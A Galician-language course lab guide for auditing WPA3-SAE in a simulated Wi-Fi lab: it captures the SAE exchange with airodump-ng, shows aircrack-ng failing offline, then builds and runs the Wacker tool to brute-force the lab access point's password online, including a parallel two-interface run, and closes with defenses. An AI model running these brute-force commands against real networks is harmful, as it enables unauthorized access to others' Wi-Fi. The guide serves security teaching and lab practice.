# Guía da práctica 3.1 — Auditoría WPA3-SAE

!!! warning "Consideracións técnicas antes dos comandos"
    O escenario `wpa3_sae` utiliza `phy0_wlan0` para o AP e `phy1_wlan1` para o cliente; as interfaces libres de observación deben comprobarse con `iw dev`. SAE negocia Commit/Confirm; unha autenticación posterior de tipo Open System pode deberse á reutilización dunha PMKSA almacenada en caché e **non demostra automaticamente unha degradación a WPA2**. Os resultados descritos no PDF son referencia docente; comproba os rexistros e a captura desta execución.


!!! important "Baseada na práctica [3-Taller-HE-Practica-WiFi-1.pdf](https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/3-Taller-HE-Practica-WiFi-1.pdf){:target="_blank"}"

## 1. Contexto e Obxectivos

Nesta práctica exploraremos a seguridade de **WPA3-SAE (Simultaneous Authentication of Equals)**. Demostraremos que, a diferenza de WPA2-PSK, WPA3-SAE é **resistente a ataques de dicionario offline**: mesmo capturando o intercambio SAE con `airodump-ng`, non é posíbel recuperar o contrasinal con `aircrack-ng`.

## 3. Preparación do escenario — Terminal 1 (PDF: Consola 1, páxinas 5–7)

Na **terminal 1** da sesión gráfica de Kali:

```bash
sudo wifilabctl up wpa3_sae
sudo wifilabctl status
```

A saída de `status` debe mostrar o AP `wlan0` en `phy0_wlan0`, o cliente `wlan1` en `phy1_wlan1` e as interfaces `wlan2` e `wlan3` dispoñibles globalmente. Non é necesario volver crear os *namespaces* nin executar manualmente `hostapd`: son operacións realizadas polo controlador.

Para consultar o estado do AP sen entrar no seu *namespace*:

```bash
sudo ip netns exec phy0_wlan0 iw dev wlan0 info
sudo tail -n 25 /home/kali/wifiLab/run/wpa3_sae/hostapd.log
```

## 4. Captura SAE e auditoría — Terminais 2 e 3

### 4.1. Preparar a terminal 3 do atacante (PDF: Consola 3, páxinas 7–8)

Na **terminal 3** (namespace global) comproba as interfaces e activa o modo monitor:

```bash
iw dev
sudo airmon-ng start wlan2
iw dev
```

A interface de captura chamarase normalmente **`wlan2mon`**. Se `airmon-ng` amosa avisos sobre procesos en conflito, **non executes `airmon-ng check kill`**: podería deter `hostapd` e `wpa_supplicant`, que manteñen o laboratorio funcionando. Se o nome da interface difire, usa o mostrado por `iw dev`.

### 4.2. Recoñecer a rede (PDF: Consola 3, páxina 8)

Na **terminal 3**:

```bash
sudo airodump-ng wlan2mon
```

Localiza `EMPRESA-XYZ` e comproba a columna de autenticación, que debe indicar **SAE** (a presentación exacta de `ENC` depende da versión de Aircrack-ng). Anota o BSSID e a canle; despois preme **`Ctrl+C`** para deter o escaneo.

### 4.3. Iniciar a captura de SAE (PDF: Consola 3, páxina 8)

Na **terminal 3**, inicia unha captura na canle do AP (no laboratorio, normalmente a 6):

```bash
mkdir -p capturas
sudo airodump-ng wlan2mon -c 6 -w capturas/cap
```

**Deixa esta terminal capturando**. Non introduzas nela os comandos de reconexión; para iso empregaremos a terminal 2. O nome do ficheiro xerado pode ser `cap-01.cap`, `cap-02.cap`, etc., segundo as capturas existentes.

### 4.4. Comprobar a conexión inicial — Terminal 2 (PDF: Consola 2, páxina 7)

Na **terminal 2**:

```bash
sudo ip netns exec phy1_wlan1 iw dev wlan1 link
```

Deberá aparecer a rede `EMPRESA-XYZ`. Ao utilizar `ip netns exec` directamente para cada orde non abandonamos a shell de Kali.

### 4.5. Reconectar o cliente sen pechar a terminal (PDF: Consola 2, páxina 8)

**Mantén `airodump-ng` capturando na terminal 3.** Na **terminal 2**, executa cada comando directamente, **sen `sudo ip netns exec ... bash` e sen `exit`**:

```bash
# Desconectar o cliente xa xestionado por wpa_supplicant
sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 disconnect

# Limpar a caché PMKSA para provocar unha nova autenticación SAE
sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 pmksa_flush
sleep 2

# Conectar de novo e comprobar a asociación
sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 reconnect
sleep 8
sudo ip netns exec phy1_wlan1 iw dev wlan1 link
```

`wpa_cli` utiliza o `wpa_supplicant` existente: **non o mata nin inicia outro en paralelo**. A primeira e terceira ordes deberían devolver `OK`; a última debe mostrar o cliente asociado. Se `wpa_cli` informa de que non pode comunicarse co proceso, detén a proba e revisa os logs antes de continuar.

Na **terminal 1**, comproba o rexistro do AP:

```bash
sudo tail -n 35 /home/kali/wifiLab/run/wpa3_sae/hostapd.log
```

Busca evidencias de autenticación SAE, asociación e finalización do intercambio de claves. Os enderezos MAC e o texto exacto dos eventos poden variar. A existencia de tramas EAPOL **non significa** que o handshake sexa vulnerable a un ataque offline de dicionario.

### 4.6. Auditar a captura — Terminal 3 (PDF: Consola 3, páxina 8)

**Volve á terminal 3** (a de `airodump-ng`), deixa transcorrer uns segundos tras a reconexión e detén a captura con **`Ctrl+C`**. En SAE pode non aparecer a indicación literal `WPA handshake:` que é habitual en WPA2-PSK; **non agardes indefinidamente por esa cabeceira**.

Na **mesma terminal 3** identifica a captura máis recente, prepara o dicionario e executa Aircrack-ng:

```bash
# Seleccionar o ficheiro de captura máis recente
CAP=$(ls -t capturas/cap-*.cap | head -n 1)
echo "$CAP"

# Rockyou pode estar xa descomprimido na VM
if [ -f /usr/share/wordlists/rockyou.txt ]; then
    WORDLIST=/usr/share/wordlists/rockyou.txt
else
    gzip -cd /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou.txt
    WORDLIST=/tmp/rockyou.txt
fi

sudo aircrack-ng "$CAP" -w "$WORDLIST"
```

O PDF (páxina 8) amosa como exemplo de saída:

```text
Unsupported key version 0 encountered.
May be WPA3 - not yet supported.
Aborted
```

A mensaxe exacta pode variar segundo a versión de Aircrack-ng e as tramas que se capturen. O resultado que se pretende comprobar é que **a captura dun intercambio WPA3-SAE non permite verificar contrasinais offline como acontece cun handshake WPA2-PSK**. O intercambio SAE de autenticación e o posterior *4-way handshake* son fases diferentes.

## 5. Análise: Por que WPA3-SAE é Resistente

| Característica              | WPA2-PSK       | WPA3-SAE             |
|-----------------------------|----------------|----------------------|
| Ataque dicionario offline   | ✗ Posíbel      | ✅ Non posíbel        |
| Deautenticación maliciosa   | ✗ Posíbel      | ✅ PMF impídeo        |
| Forward Secrecy             | ✗ Non          | ✅ Si                 |
| Crack con aircrack-ng       | ✗ Posíbel      | ✅ Non soportado      |

## 6. Wacker: Ataque por Forza Bruta Online contra WPA3-SAE

> 💡 **Mensaxe clave:** WPA3-SAE elimina os ataques offline de dicionario (non se pode crackear o handshake capturado). Porén, **si é posible un ataque online de forza bruta directa** contra o AP. A única defensa real é a **fortaleza do contrasinal**.

---

### 6.1. Por que WPA3-SAE non é vulnerable a ataques offline... pero si a ataques online

En WPA2-PSK, o ataque captura o 4-way handshake e crackéao offline sen límite de velocidade. **WPA3-SAE bloquea este vector** mediante o protocolo Dragonfly: cada sesión deriva claves únicas (Forward Secrecy) que non permiten reconstruír o contrasinal desde o tráfico capturado.

Porén, **o protocolo SAE require que o AP responda a cada intento de autenticación**. Isto permite un ataque diferente: **probar contrasinais directamente contra o AP en tempo real**.

| Característica             | WPA2-PSK offline       | WPA3-SAE online (wacker)          |
|----------------------------|:----------------------:|:---------------------------------:|
| Captura de handshake       | ✔ Necesaria            | ✗ Non necesaria                   |
| Cracking offline           | ✔ Sen límite           | ✗ Imposible (Forward Secrecy)     |
| Tentativas por segundo     | Millóns (GPU)          | ~80-150 (limitado pola rede)      |
| Detectable polo AP/IDS     | ✗ Invisible            | ✔ Visible (tráfico SAE continuo)  |
| Éxito depende de           | GPU + wordlist         | **Fortaleza do contrasinal**      |

---

### 6.2. Wacker: ferramenta de dicionario online para WPA3-SAE

**[Wacker](https://github.com/blunderbuss-wctf/wacker){:target="_blank"}** é un cracker de dicionario para WPA3-SAE que usa o **interface de control de `wpa_supplicant`** para lanzar intentos de autenticación SAE directamente contra o AP, sen capturar ningún handshake previo.

Mecanismo de funcionamento:  
1. Wacker lanza o seu propio `wpa_supplicant` parcheado  
2. Para cada palabra da wordlist, tenta autenticarse co AP mediante SAE Commit/Confirm  
3. O AP responde con éxito ou fallo  
4. Wacker interpreta a resposta e pasa á seguinte palabra  

**Características clave:**  
- ✔ Non require captura de tráfico previa — ataque puro online  
- ✔ Compatible con `mac80211_hwsim` — funciona no noso laboratorio  
- ✔ Paralelizable con múltiples interfaces e fragmentos da wordlist  
- ⚠️ Lento (~80-150 palabras/segundo) fronte a cracking offline (millóns/segundo con GPU)  
- ⚠️ Detectable: o AP ve tráfico SAE anómalo continuo  
- ⚠️ Vulnerable a bloqueo por MAC: o AP pode blacklistear a MAC atacante

### 6.3. Instalación de wacker (Terminal 3; PDF: Consola 3, páxinas 9–10)

Para esta práctica mantense **`wpa3_sae`**, xa iniciado no apartado 3. Non cambies a `wpa3_sae_vulnerable`: ese escenario está reservado para a práctica 3.3 e nel `wlan2` non queda dispoñible no namespace global. Wacker require compilar o seu propio `wpa_supplicant` parcheado. Executa estes comandos na **terminal 3**, no namespace global (PDF: Consola 3, páxinas 9–10):

```bash
sudo su -

# Instalar dependencias de compilación
apt-get install -y pkg-config libnl-3-dev gcc libssl-dev libnl-genl-3-dev git

# Clonar wacker
cd /opt
git clone https://github.com/blunderbuss-wctf/wacker.git
cd wacker

# Aplicar o patch ao wpa_supplicant incluído no repositorio
git apply wpa_supplicant.patch

# Compilar wpa_supplicant parcheado (pode tardar varios minutos)
cp defconfig wpa_supplicant-2.10/wpa_supplicant/.config
cd wpa_supplicant-2.10/wpa_supplicant
make -j4

# Verificar compilación
ls -lh wpa_supplicant
# -rwxr-xr-x 1 root root ~13M ... wpa_supplicant
```

> ⚠️ Este `wpa_supplicant` compilado úsao wacker internamente — **non substitúe** o do sistema.

### 6.4. Identificar o obxectivo (Terminal 3; PDF: Consola 3, páxina 10)

Wacker comproba contrasinais **en liña** contra o **AP WPA3-SAE do laboratorio** (`wlan0`). As interfaces `wlan2` e `wlan3` están dispoñibles no namespace global para o atacante: ningunha delas é un AP falso.

```bash
# Obter BSSID do AP lexítimo WPA3 (wlan0) e a súa frecuencia
sudo ip netns exec phy0_wlan0 iw dev wlan0 info

# Saída esperada:
# Interface wlan0
#   addr EA:18:30:AA:C3:48      ← BSSID_AP (anota este valor)
#   ssid EMPRESA-XYZ
#   channel 6 (2437 MHz)        ← FREQ = 2437

# Gardar para uso posterior
BSSID_AP="EA:18:30:AA:C3:48"   # substituír polo BSSID real
FREQ=2437
```

> 💡 O BSSID real pode diferir en cada arranque do laboratorio. Verificar sempre con `iw dev wlan0 info` ou `wifilabctl status`.

### 6.5. Executar wacker (Terminal 4; PDF: Consola 4, páxina 10)

Abrir **outra terminal**. Wacker usará `wlan2` (interface libre no namespace global — a mesma usada para `airodump-ng` nas seccións anteriores, pero agora en modo managed):

```bash
sudo su -
cd /opt/wacker

# Asegurarse de que wlan2 NON está en modo monitor (parar airmon-ng se estivese activo)
airmon-ng stop wlan2mon 2>/dev/null || true
ip link set wlan2 down
iw dev wlan2 set type managed
ip link set wlan2 up

# Descomprimir wordlist
gunzip -kf /usr/share/wordlists/rockyou.txt.gz

# Lanzar wacker (substituír BSSID_AP e FREQ polos valores reais)
python3 wacker.py   --wordlist /usr/share/wordlists/rockyou.txt   --interface wlan2   --bssid EA:18:30:AA:C3:48   --ssid EMPRESA-XYZ   --freq 2437
```

**Saída esperada durante o ataque:**
```
Start time: 20 Feb 2026 10:15:32
Starting wpa_supplicant...
    1532 / 14344391   words (0.01%) :  82.3 words/sec : 0.005 hours lapsed :  48.4 hours to exhaust
    3847 / 14344391   words (0.03%) :  79.8 words/sec : 0.013 hours lapsed :  49.9 hours to exhaust
    ...
Found the password: 'spongebob19'

Stop time: 20 Feb 2026 10:19:47
```

> ⚠️ Con `rockyou.txt` e o contrasinal `spongebob19` (débil, presente na wordlist), wacker atopa o contrasinal en **minutos**. Con un contrasinal forte de 20+ caracteres aleatorios, o ataque tardaría séculos.

### 6.6. Paralelización de Wacker con dúas interfaces (opcional; PDF: páxina 11)

No **PDF de referencia, páxina 11**, esta ampliación repártese entre as consolas 3 e 4. No laboratorio automatizado utilízanse as mesmas terminais: **terminal 3 con `wlan3`** e **terminal 4 con `wlan2`**. Non se necesita unha quinta terminal.

O escenario `wpa3_sae` dispón de **catro radios simuladas**: `wlan0` para o AP, `wlan1` para o cliente e **`wlan2` e `wlan3` libres para o atacante**. Esta sección é opcional: realízaa despois de rematar a proba individual do apartado 6.5 e deter esa instancia de Wacker con `Ctrl+C`.

#### Preparación da segunda radio e do dicionario — Terminal 3

Na **terminal 3**, unha vez finalizada a captura do apartado 4, comproba que ambas interfaces están no *namespace* global:

```bash
sudo wifilabctl status
iw dev
```

Se `wlan2` aínda figura como `wlan2mon`, a terminal 4 deberá restaurala a modo *managed* como se explicou no apartado 6.5. Para a **segunda interface** `wlan3`, executa:

```bash
sudo ip link set wlan3 down
sudo iw dev wlan3 set type managed
sudo ip link set wlan3 up
sudo iw dev wlan3 info
```

O tipo esperado é `managed`. **Non utilices `airmon-ng check kill`**, porque pode deter procesos do AP e do cliente.

Divide Rockyou en dous ficheiros distintos. O comando `split` de GNU/Linux divide o dicionario por liñas e deixa os fragmentos claramente identificados, sen modificar o orixinal:

```bash
sudo split -n l/2 -d -a 1 \
  --additional-suffix=.txt \
  /usr/share/wordlists/rockyou.txt \
  /tmp/wifilab-wacker-parte-

ls -lh /tmp/wifilab-wacker-parte-{0,1}.txt
```

Os dous ficheiros resultantes son `/tmp/wifilab-wacker-parte-0.txt` e `/tmp/wifilab-wacker-parte-1.txt`. Cada instancia probará un fragmento diferente.

#### Primeiro atacante — Terminal 4 (`wlan2`)

Coa radio `wlan2` xa restaurada a modo *managed* no apartado 6.5, obtén o BSSID real e executa Wacker co primeiro fragmento:

```bash
cd /opt/wacker
BSSID_AP=$(sudo ip netns exec phy0_wlan0 iw dev wlan0 info | awk '$1=="addr" {print $2; exit}')
echo "AP WPA3-SAE: $BSSID_AP"
sudo python3 wacker.py \
  --wordlist /tmp/wifilab-wacker-parte-0.txt \
  --interface wlan2 \
  --bssid "$BSSID_AP" \
  --ssid EMPRESA-XYZ \
  --freq 2437
```

**Deixa esta terminal traballando** mentres abres a terminal 3.

#### Segundo atacante — Terminal 3 (`wlan3`)

```bash
cd /opt/wacker
BSSID_AP=$(sudo ip netns exec phy0_wlan0 iw dev wlan0 info | awk '$1=="addr" {print $2; exit}')
echo "AP WPA3-SAE: $BSSID_AP"
sudo python3 wacker.py \
  --wordlist /tmp/wifilab-wacker-parte-1.txt \
  --interface wlan3 \
  --bssid "$BSSID_AP" \
  --ssid EMPRESA-XYZ \
  --freq 2437
```

Comproba nos dous terminais que Wacker inicia o seu `wpa_supplicant` de traballo e realiza intentos co fragmento correspondente. Se unha das instancias localiza a clave de proba, detén a outra con `Ctrl+C`.

!!! note "Interpretación e alcance desta proba"
    A existencia de dúas radios e dous procesos **non garante** que o AP admita ambos de forma simultánea nin que a velocidade se duplique. O procedemento está preparado para reproducir a ampliación do PDF, pero a **execución concorrente debe validarse experimentalmente na VM** antes de dar este apartado por completado. Non é necesario para validar o resto da práctica 3.1.


!!! tip "Wrapper `wacker` (opcional)"
    Para executar Wacker desde calquera directorio pódese crear este script **unha soa vez**. Debe conservar a primeira liña `#!/usr/bin/env bash`:

    ```bash
    sudo tee /usr/local/bin/wacker >/dev/null <<'WSCRIPT'
    #!/usr/bin/env bash
    cd /opt/wacker
    exec python3 ./wacker.py "$@"
    WSCRIPT
    sudo chmod 755 /usr/local/bin/wacker
    ```

    As terminais 3 e 4 poden utilizar `wacker` en lugar de `sudo python3 wacker.py`, mantendo os demais argumentos. O comando débese executar con `sudo` porque o proceso necesita controlar interfaces Wi-Fi:

    ```bash
    sudo wacker --wordlist /tmp/wifilab-wacker-parte-0.txt --interface wlan2 --bssid "$BSSID_AP" --ssid EMPRESA-XYZ --freq 2437
    sudo wacker --wordlist /tmp/wifilab-wacker-parte-1.txt --interface wlan3 --bssid "$BSSID_AP" --ssid EMPRESA-XYZ --freq 2437
    ```

    Cada liña execútase na súa terminal correspondente e presupón que nela se obtivo previamente o BSSID real, como se explica no apartado 6.6.

### 6.8. Conclusión: a seguridade de WPA3-SAE depende do contrasinal

A práctica demostrou empiricamente que:

- `airodump-ng` captura o intercambio SAE pero **non contén datos crackeables**.
- `aircrack-ng` falla explicitamente: `May be WPA3 - not yet supported`.

Na **[Práctica 3.2](https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/3-Taller-HE-Practica-WiFi-2.pdf){:target="_blank"}** estudaremos KRACK e as condicións nas que pode producirse unha reinstalación de claves. Non se debe atribuír a PMF unha inmunidade absoluta fronte a KRACK. A práctica 3.2 dispón do seu propio procedemento e evidencias.

```
SEGURIDADE WPA3-SAE = f(fortaleza do contrasinal)
```

| Tipo de contrasinal             | Exemplo                   | Tempo estimado (wacker, 1 NIC) |
|---------------------------------|---------------------------|--------------------------------|
| Palabra de dicionario           | `spongebob19`             | **Minutos** (en rockyou)       |
| Frase curta predecible          | `minomerodecasa`          | **Horas-días** (wordlists específicas) |
| 12 caracteres mixtos            | `X9k!mP2@qR5n`           | **Anos** (fóra de wordlists)   |
| 20+ caracteres aleatorios       | `v7#Kp!2mNxQ8@wLjR4s`   | **Séculos** (imposible na práctica) |

**Defensas contra wacker:**  
- ✔ **Contrasinal ≥ 20 caracteres** aleatorios — a única defensa realmente efectiva  
- ✔ **`sae_anti_clogging_threshold=5`** en `hostapd.conf` — limita a taxa de intentos SAE  
- ✔ **Monitorización de intentos SAE fallidos** con IDS/SIEM — wacker xera moito ruído visible  
- ✔ **WPA3-Enterprise (EAP-TLS)** — elimina completamente o risco de forza bruta ao contrasinal compartido
